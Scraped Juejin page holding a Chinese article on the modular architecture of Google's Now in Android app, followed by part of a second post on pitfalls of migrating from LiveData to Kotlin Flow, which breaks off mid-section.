.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>截至2026年，<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fnowinandroid" target="_blank" title="https://github.com/android/nowinandroid" ref="nofollow noopener noreferrer">Now in Android</a></strong>（以下简称 NiA）依然是由 Google 官方维护、最能代表“现代 Android 应用架构”的标杆项目，GitHub 星标已突破 20K。</p>
<p>它不仅系统性地展示了 Jetpack 全家桶的最佳实践，更关键的是，提供了一整套面向中大型项目的可落地工程方案——涵盖<strong>模块化设计</strong>、<strong>分层架构</strong>、<strong>自动化测试</strong>、<strong>性能分析</strong>、<strong>代码提交、风格检查</strong>以及<strong>团队协作</strong>等核心环节，是 <strong>Android 应用开发者的必学项目</strong>。</p>
</blockquote>
<p>本系列文章专为 Android 应用开发者打造，将以抓大放小的模式深入解析 Now in Android 的设计精髓，全系列共八章。</p>
<ul>
<li><strong>《Now in Android 现代应用开发实践（一）：模块化设计》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（二）：架构设计（data+domain）》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（三）：架构设计（UI）》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（四）：构建逻辑》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（五）：代码规范》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（六）：质量保障体系》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（七）：Benchmark 性能测试》</strong></li>
<li><strong>《Now in Android 现代应用开发实践（八）：Baseline 性能优化》</strong></li>
</ul>
<hr/>
<p>本文作为开篇，将结合 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fmodularization" target="_blank" title="https://developer.android.com/topic/modularization" ref="nofollow noopener noreferrer">Android 官方模块化指南</a>，重点解读 NiA 的模块化设计思路，帮助你厘清以下关键问题：</p>
<ul>
<li><strong>为什么需要模块化？</strong></li>
<li><strong>NiA 到底如何划分模块？</strong></li>
<li><strong>它遵循了</strong> <strong>哪种</strong> <strong>官方推荐的模块化模式？</strong></li>
<li><strong>哪些设计决策值得在实际项目中借鉴？</strong></li>
</ul>
<p>通过本文，你将获得一套可复用的模块化思维框架，为构建健壮、可维护的现代 Android 应用打下坚实基础。</p>
<hr/>
<h2 data-id="heading-0">一、为什么绕不开模块化？</h2>
<p>Android官方模块化指南把好处总结得很直接：</p>
<ul>
<li><strong>构建速度</strong>：增量编译、并行执行、缓存命中率大幅提升</li>
<li><strong>可维护性：</strong> 关注点分离、降低耦合、修改一处不影响全局</li>
<li><strong>团队协作：</strong> 模块可以分配owner，减少代码冲突</li>
<li><strong>可测试性：</strong> 模块粒度测试更容易Mock、更快运行</li>
<li><strong>可重用性：</strong> 核心功能模块可复用到多个App/变体/Wear/TV</li>
<li><strong>功能按需交付</strong>（Dynamic Feature）潜力</li>
<li><strong>封装与可见性控制：</strong> 利用<code>internal</code>真正隐藏实现细节</li>
</ul>
<p>简单总结就是，<strong>当项目超过2-3万行代码、超过5-8人团队时，模块化几乎是唯一能把复杂度控制住的手段</strong>。</p>
<hr/>
<h2 data-id="heading-1">二、主流模块化方案分析</h2>
<p>在 Android 架构设计中，常见的模块组织模式主要有三种：<strong>纯分层</strong>、<strong>纯按功能划分</strong>，以及<strong>分层与功能混合</strong>的模式。</p>
<p><strong>1.纯分层模式</strong></p>
<ul>
<li>
<p><strong>核心思路</strong>：按照技术职责纵向划分，典型的层级顺序为 data → domain → feature → app。</p>
</li>
<li>
<p><strong>优点</strong>：这种结构清晰简单，天然契合 MVVM 架构思想，易于上手。</p>
</li>
<li>
<p><strong>缺点</strong>：不同业务功能之间容易产生耦合，因为它们共享同一套分层结构，修改一个模块可能影响其他模块。</p>
</li>
<li>
<p><strong>适用场景</strong>：<strong>适合中小型项目</strong>，团队规模不大、业务复杂度较低时使用效果较好。</p>
</li>
</ul>
<p><strong>2.纯按功能划分模式</strong></p>
<ul>
<li>
<p><strong>核心思路</strong>：以业务功能为单位横向组织代码，每个功能模块（如“登录”、“个人中心”、“订单”）几乎形成一个独立闭环，包含自己的数据、领域逻辑和 UI 层（类似<strong>组件化</strong>）。</p>
</li>
<li>
<p><strong>优点</strong>：这种方式实现了极高的模块独立性，非常适合多团队并行开发，并支持动态下发或独立发布特定功能。</p>
</li>
<li>
<p><strong>缺点</strong>：其代价是容易造成重复代码（比如多个模块各自实现相似的网络请求或工具类），且全局数据层难以统一设计和维护。</p>
</li>
<li>
<p><strong>适用场景</strong>：它主要<strong>适用于超大型应用</strong>，尤其是需要多团队协作、支持模块化动态交付的场景。</p>
</li>
</ul>
<p><strong>3.分层 + 功能混合模式</strong></p>
<ul>
<li>
<p><strong>核心思路</strong>：将架构分为两大部分：底层是高度抽象、通用的核心层（包含共享的数据源、工具类、基础组件等），上层则是按功能划分的独立业务模块。</p>
</li>
<li>
<p><strong>优点</strong>：既保证了通用能力的复用，又赋予各业务模块足够的自治性。它在可维护性、可扩展性和团队协作效率之间取得了良好平衡</p>
</li>
<li>
<p><strong>缺点</strong>：初期架构搭建和理解成本略高，需要团队有一定经验，</p>
</li>
<li>
<p><strong>适用场景</strong>：<strong>中大型生产项目</strong>主流选择</p>
</li>
</ul>
<p><strong>Now in Android 采用的就是第三种“分层 + 功能混合”模式，而且做了非常有特色的细化 - Feature模块内部api / impl 双层分离。</strong></p>
<hr/>
<h2 data-id="heading-2">三、NiA 模块化结构解析</h2>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">:app</span>                       <span class="hljs-comment"># 应用入口（脚手架 + 导航）</span>
│
├─ <span class="hljs-symbol">:feature</span>
│   ├─ <span class="hljs-symbol">:foryou</span>
│   │   ├─ <span class="hljs-symbol">:api</span>           <span class="hljs-comment"># 只放导航key和导航扩展函数</span>
│   │   └─ <span class="hljs-symbol">:impl</span>          <span class="hljs-comment"># 真正的Screen、ViewModel、UI逻辑</span>
│   ├─ <span class="hljs-symbol">:interests</span>
│   ├─ <span class="hljs-symbol">:topic</span>
│   └─ ... (其他业务功能)
│
├─ <span class="hljs-symbol">:core</span>
│   ├─ <span class="hljs-symbol">:data</span>              <span class="hljs-comment"># 统一对外数据仓库（Repository）</span>
│   ├─ <span class="hljs-symbol">:network</span>           <span class="hljs-comment"># Retrofit + 数据源</span>
│   ├─ <span class="hljs-symbol">:database</span>          <span class="hljs-comment"># Room</span>
│   ├─ <span class="hljs-symbol">:datastore</span>         <span class="hljs-comment"># Preferences DataStore</span>
│   ├─ <span class="hljs-symbol">:model</span>             <span class="hljs-comment"># 纯Kotlin 数据类（跨模块共享）</span>
│   ├─ <span class="hljs-symbol">:ui</span>                <span class="hljs-comment"># 复合UI组件（依赖model和data）</span>
│   ├─ <span class="hljs-symbol">:designsystem</span>      <span class="hljs-comment"># 基础UI组件 + 主题 + 图标（纯Compose）</span>
│   ├─ <span class="hljs-symbol">:common</span>            <span class="hljs-comment"># 通用工具、Dispatchers、Result封装等</span>
│   └─ <span class="hljs-symbol">:testing</span>           <span class="hljs-comment"># 测试桩、TestRunner等</span>
│   └─ ...
│
├─ <span class="hljs-symbol">:sync</span>                  <span class="hljs-comment"># 工作管理器同步任务（同样属于应用的业务逻辑）</span>
├─ <span class="hljs-symbol">:benchmark</span>             <span class="hljs-comment"># 宏基准测试</span>
└─ <span class="hljs-symbol">:app-NiA-catalog</span>       <span class="hljs-comment"># 静态展示App内的组件，是一个独立应用</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1325524ed8294234a8f9bc372cdef98f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6X5qCpbGluaw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893200&amp;x-signature=cwxbwxjEx0MYO8L6GMvOEdf2Gh0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">1.App 模块：应用的 “粘合剂”</h3>
<p>App 模块是整个应用的入口，属于<code>android-application</code>类型，核心职责是<strong>整合所有模块，提供应用级脚手架</strong>，不承担具体业务逻辑。</p>
<p><strong>核心内容：</strong></p>
<ul>
<li>包含<code>MainActivity</code>、<code>NiAApp</code>等应用级入口类，以及全局导航配置（如<code>NiANavHost</code>实现应用级导航、<code>TopLevelNavItem</code>配置底部导航栏）；</li>
</ul>
<p><strong>依赖规则：</strong></p>
<ul>
<li>依赖所有功能（Feature）模块和所需的核心（Core）模块，是依赖链的 “顶端”。</li>
</ul>
<h3 data-id="heading-4">2.功能（Feature）模块：业务逻辑的载体</h3>
<p>Feature 模块是应用的业务核心，每个模块聚焦一个具体功能（如 “为你推荐”“兴趣管理”“主题详情”），遵循 “单一职责” 设计。</p>
<p>NiA 对 Feature 模块做了精细化拆分 —— 每个 Feature 模块拆分为两个子模块：</p>
<ul>
<li><strong><code>api</code></strong> <strong>子模块</strong>：仅包含导航键（如<code>TopicNavKey</code>）和导航函数（如<code>Navigator.navigateToTopic</code>），用于对外暴露跳转能力；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57846ddf6f1044fe8cdf16086f8e3120~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6X5qCpbGluaw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893200&amp;x-signature=RetryQ%2B6uaI3lVjJPEiM4ReAX3M%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong><code>impl</code></strong> <strong>子模块</strong>：包含功能的所有核心逻辑（UI 界面、ViewModel、业务处理等），是功能的实际实现层。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2788c186da124001896e2ed3e0332adc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6X5qCpbGluaw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893200&amp;x-signature=ljUO9ZsWn7NNWeUX7EIMQrfGhG8%3D" alt="" loading="lazy"/></p>
<p><strong>依赖规则：</strong></p>
<ul>
<li>
<p><strong><code>api</code></strong> <strong>子模块</strong>：不依赖其他 Feature 的<code>api</code>/<code>impl</code>子模块，仅依赖 Core 模块；</p>
</li>
<li>
<p><strong><code>impl</code></strong> <strong>子模块</strong>：仅可依赖其他 Feature 的<code>api</code>子模块（用于跨功能跳转），且仅依赖所需的 Core 模块；</p>
</li>
<li>
<p>核心原则：避免 Feature 模块间的直接耦合，通过<code>api</code>层实现 “最小化依赖”。</p>
</li>
</ul>
<h3 data-id="heading-5">3.核心（Core）模块：通用能力的封装</h3>
<p>核心模块是通用的库模块，包含辅助代码和需要在应用其他模块间共享的特定依赖项。这些模块可以依赖于其他核心模块，但不应依赖于功能模块或app模块。</p>



















































































<table><thead><tr><th>模块路径</th><th>主要功能 / 职责</th><th>典型类 / 文件示例</th><th>备注说明</th></tr></thead><tbody><tr><td>:core:model</td><td>存放应用中通用的纯Kotlin数据模型类（无Android依赖）</td><td>NewsResource, Topic, Episode, Author</td><td>纯jvm module，最底层模型</td></tr><tr><td>:core:database</td><td>使用Room实现本地数据库，包括数据库定义、Entity、Dao和迁移</td><td>NiADatabase, NewsResourceDao, DatabaseMigrations</td><td>Room数据库核心</td></tr><tr><td>:core:datastore</td><td>使用Preferences DataStore存储用户偏好设置（轻量级KV存储）</td><td>NiAPreferences, UserPreferencesSerializer</td><td>常用于用户偏好、首次启动标志等</td></tr><tr><td>:core:datastore-proto</td><td>DataStore的protobuf定义文件（独立出来方便多平台复用）</td><td>.proto 文件（如user_preferences.proto）</td><td>一般不直接使用，仅供datastore依赖</td></tr><tr><td>:core:network</td><td>网络层实现，包括Retrofit接口定义、数据源、拦截器等</td><td>RetrofitNiANetworkApi, NiANetworkDataSource</td><td>远程数据源核心</td></tr><tr><td>:core:data</td><td>数据层统一对外接口（Repository模式），聚合本地+远程数据源，提供业务所需数据</td><td>TopicsRepository, NewsRepository, UserDataRepository</td><td>最常用的数据仓库入口</td></tr><tr><td>:core:data-test</td><td>数据层相关的测试桩（fake实现、测试双重实现）</td><td>FakeNewsRepository, TestNiANetworkDataSource</td><td>专供单元测试/集成测试使用</td></tr><tr><td>:core:ui</td><td>业务相关的复合UI组件（依赖model和data层，能展示真实业务数据）</td><td>NewsResourceCard, NewsFeed, TopicGridItem</td><td>区别于designsystem，更偏业务</td></tr><tr><td>:core:designsystem</td><td>基础设计系统：主题、颜色、排版、图标、基础Compose组件</td><td>NiATheme, NiAButton, NiAIcons, NiATopAppBar</td><td>类似组件库，可单独预览</td></tr><tr><td>:core:common</td><td>通用工具类、扩展函数、跨模块共享的小型工具</td><td>NiADispatchers, Result, Async, DispatcherProvider</td><td>放那些到处都要用的小工具</td></tr><tr><td>:core:analytics</td><td>埋点/分析相关接口与实现（目前主要对接Firebase Analytics）</td><td>AnalyticsHelper, StubAnalyticsHelper</td><td>可切换真实/空实现，方便测试</td></tr><tr><td>:core:testing</td><td>通用测试工具、规则、runner、Hilt测试模块等</td><td>NiATestRunner, TestDispatcherRule, HiltTest</td><td>几乎所有测试模块都会依赖它</td></tr></tbody></table>
<h3 data-id="heading-6">4.数据同步（Sync）模块</h3>
<p><strong><code>sync</code></strong>: 负责处理后台同步逻辑。它利用 WorkManager 定时或根据触发条件从网络更新数据，并将其持久化到本地数据库中。</p>
<blockquote>
<p>NiA采用本地数据优先的架构设计方式，有关架构设计的分析下一章会详细介绍。</p>
</blockquote>
<h3 data-id="heading-7">5.工程治理与构建逻辑类</h3>
<p>这类模块不直接包含业务代码，而是为了管理日益复杂的 Gradle 构建配置。</p>
<ul>
<li>
<p><strong><code>build-logic</code></strong>: 这是 NiA 最核心的构建管理模块。随着模块数量增加，NiA 提取了通用的配置插件（Convention Plugins），用于统一管理各模块的编译 SDK 版本、Compose 配置、Lint 规则和 Hilt 依赖。这样可以避免在几十个模块的 <code>build.gradle</code> 中重复写相同的配置。</p>
</li>
<li>
<p><strong><code>spotless</code></strong>: 这是一个代码格式化工具模块。它通过配置特定的规则（如 Kotlin 编码规范、License 头部信息），确保所有开发者提交的代码风格高度统一。在 NiA 中，它通常结合 Git Hooks 或 CI 流程使用。</p>
</li>
<li>
<p><strong><code>lint</code></strong>: 包含自定义的 Lint 规则。除了 Android 默认的检查外，NiA 开发团队编写了特定的静态代码检查规则，以确保项目遵循特定的架构规范（例如：禁止在某些层级直接引用特定库）。</p>
</li>
</ul>
<h3 data-id="heading-8">6.测试与性能分析类</h3>
<p>这类模块用于保障应用的质量和运行效率。</p>
<ul>
<li>
<p><strong><code>benchmark</code></strong>: 包含 Macrobenchmark 测试代码。它专门用于测量应用的启动性能和滚动帧率（Jank）。通过这个模块，开发者可以生成 Baseline Profiles 以优化应用的首次运行速度。</p>
</li>
<li>
<p><strong><code>ui-test-hilt-manifest</code></strong>: 这是一个特殊的辅助模块。由于 Hilt 在进行集成测试时需要一个空的 <code>ComponentActivity</code> 作为容器，该模块专门提供所需的 Android Manifest 和 Activity 声明，确保测试代码能正常注入依赖，同时不污染生产代码。</p>
</li>
</ul>
<h3 data-id="heading-9">7.基础设施与工具类</h3>
<ul>
<li><strong><code>tools</code></strong>: 存放开发辅助脚本。</li>
<li><strong><code>kokoro</code></strong>: 这是 Google 内部使用的持续集成（CI）配置文件路径。它包含用于在 Google 基础设施上运行构建、测试和发布流程的脚本（类似于公共领域的 GitHub Actions 配置）。</li>
<li><strong><code>app-NiA-catalog</code></strong>: 这是一个独立的“设计系统目录”APP。它不具备新闻浏览功能，而是专门用于展示 <code>core:designsystem</code> 中定义的所有 UI 组件（如按钮、图标、颜色）。开发者可以通过运行这个 App 快速预览和调试 UI 组件，而无需启动整个主应用。</li>
</ul>
<hr/>
<h2 data-id="heading-10">四、值得借鉴的几个关键决策点</h2>
<p><strong>1.什么时候把功能拆成</strong> <strong><code>api</code></strong> <strong>/</strong> <strong><code>impl</code></strong> <strong>双模块？</strong></p>
<p>当这个功能<strong>会被多个其他页面跳转</strong>时（例如 topic、bookmark、search 都是常见被跳转目标）</p>
<p><strong>2.core 模块要拆多细？</strong></p>
<p>NiA给出了比较务实的参考：</p>
<ul>
<li>
<p>数据层较小时，可以只保留 <code>:core:data</code></p>
</li>
<li>
<p>数据源/仓库变多时，再拆 <code>:network</code>、<code>:database</code>、<code>:datastore</code></p>
</li>
<li>
<p>UI组件较多时，拆 <code>:designsystem</code>（纯公共UI组件） 和 <code>:ui</code>（业务UI组件）</p>
</li>
</ul>
<p><strong>3.要不要追求极致模块化？</strong></p>
<p>根据NiA官方的说法： “<strong>我们在过度模块化一个小应用 和 展示适用于生产级大型代码库的模式 之间寻找平衡。</strong> ”所以<strong>适度模块化</strong>才是王道——<strong>粒度太细会显著增加构建配置和维护成本</strong>。</p>
<hr/>
<h2 data-id="heading-11">五、总结与建议</h2>
<p>Now in Android 的模块化设计是目前（2026年）Android社区里<strong>最值得参考的生产级实践</strong>之一。相比其他 Android 示例（如 Todoist 或 Sunflower），NiA 更注重 Compose UI 和模块化架构的深度集成。</p>
<p>NiA采用<strong>分层 + 功能混合</strong>模式，并通过<strong>功能模块 api/impl 分离</strong>巧妙地解决了功能间跳转耦合问题，同时保持了核心代码的高度可重用性。</p>
<p>如果你正在/准备做一个<strong>中大型项目</strong>（预计&gt;10个主要页面、&gt;5人团队协作、生命周期&gt;2年），强烈建议你：</p>
<p>1.先画出<strong>模块依赖图</strong>（Mermaid/PlantUML/手绘都行）</p>
<p>2.决定<strong>核心模块</strong>的拆分粒度</p>
<p>3.对于<strong>高频被跳转</strong>的功能模块，考虑采用 <strong>api / impl</strong> 分离</p>
<p>4.所有模块都写<strong>README + 依赖图</strong>（NiA中的依赖关系图由工程脚本自动生成，后续将讲解如何实现）</p>
<p>下一篇文章我们将深入剖析 NiA 的<strong>架构设计</strong>，敬请期待～</p>
<hr/>
<p><strong>参考资料</strong>：</p>
<ul>
<li>Android 官方模块化指南：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.google.cn%2Ftopic%2Fmodularization" target="_blank" title="https://developer.android.google.cn/topic/modularization" ref="nofollow noopener noreferrer">developer.android.google.cn/topic/modul…</a></li>
<li>Android 官方模块化模式：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.google.cn%2Ftopic%2Fmodularization%2Fpatterns" target="_blank" title="https://developer.android.google.cn/topic/modularization/patterns" ref="nofollow noopener noreferrer">developer.android.google.cn/topic/modul…</a></li>
<li>Now in Android GitHub 主仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fnowinandroid" target="_blank" title="https://github.com/android/nowinandroid" ref="nofollow noopener noreferrer">github.com/android/now…</a></li>
</ul>
<blockquote>
<p>本文写作时使用的辅助AI模型：Gemini Pro + Qwen3 Max</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LiveData 到 Flow 的迁移：我踩过的 5 个坑]]></title>    <link>https://juejin.cn/post/7603183929251889204</link>    <guid>https://juejin.cn/post/7603183929251889204</guid>    <pubDate>2026-02-05T12:58:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603183929251889204" data-draft-id="7603195960254595072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LiveData 到 Flow 的迁移：我踩过的 5 个坑"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T12:58:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Fushize"/> <meta itemprop="url" content="https://juejin.cn/user/2367696439872411"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LiveData 到 Flow 的迁移：我踩过的 5 个坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2367696439872411/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Fushize
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:58:06.000Z" title="Thu Feb 05 2026 12:58:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在 Android 项目中从 <strong>LiveData 迁移到 Kotlin Flow</strong>，看起来像是一次“顺理成章的技术升级”，但真正落地后，我才意识到：<br/>
<strong>Flow 不是 LiveData 的 1:1 替代，而是一整套响应式模型的变化</strong>。</p>
<p>下面记录我在真实项目迁移过程中踩过的 <strong>5 个典型坑</strong>，以及最终的解决方式。</p>
<hr/>
<h2 data-id="heading-0">坑一：把 Flow 当成“更高级的 LiveData”</h2>
<h3 data-id="heading-1">当时的错误认知</h3>
<p>一开始我几乎是“机械迁移”：</p>
<pre><code class="hljs language-sql" lang="sql">val userLiveData: LiveData<span class="hljs-operator">&lt;</span><span class="hljs-keyword">User</span><span class="hljs-operator">&gt;</span> ↓ val userFlow: Flow<span class="hljs-operator">&lt;</span><span class="hljs-keyword">User</span><span class="hljs-operator">&gt;</span>

ViewModel 暴露 Flow，UI <span class="hljs-keyword">collect</span>，看起来一切正常。
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-2">实际问题</h3>
<ul>
<li>LiveData 是 <strong>生命周期感知 + 热数据</strong></li>
<li>Flow 默认是 <strong>冷流</strong></li>
</ul>
<p>结果是：</p>
<ul>
<li>每次 <code>collect</code> 都重新执行一遍上游逻辑</li>
<li>网络请求、数据库查询被重复触发</li>
</ul>
<h3 data-id="heading-3">本质原因</h3>
<p>LiveData：<strong>数据源一直存在，UI 只是订阅</strong><br/>
Flow：<strong>UI 订阅 = 触发数据生产</strong></p>
<h3 data-id="heading-4">我的修正方式</h3>
<p>对于“状态型数据”，<strong>不直接暴露普通 Flow</strong>，而是：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> userState: StateFlow&lt;User&gt;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>并在 ViewModel 中：</p>
<pre><code class="hljs language-ini" lang="ini">stateIn( <span class="hljs-attr">scope</span> = viewModelScope, started = SharingStarted.WhileSubscribed(<span class="hljs-number">5000</span>), initialValue = User.Empty )
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>结论</strong>：</p>
<blockquote>
<p>Flow ≠ LiveData，<br/>
LiveData 更接近的是 <code>StateFlow</code> / <code>SharedFlow</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-5">坑二：collect 写在错误的生命周期里</h2>
<h3 data-id="heading-6">常见写法（我一开始也这么干）</h3>
<pre><code class="hljs">lifecycleScope.launch { viewModel.flow.collect { ... } }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-7">问题表现</h3>
<ul>
<li>页面退到后台，Flow 仍在收集</li>
<li>重进页面，出现<strong>重复 collect</strong></li>
<li>某些场景下 UI 被更新多次</li>
</ul>
<h3 data-id="heading-8">根因</h3>
<p>Flow <strong>不自动感知生命周期</strong>，不像 LiveData 那样“活着就收，死了就停”。</p>
<h3 data-id="heading-9">正确姿势</h3>
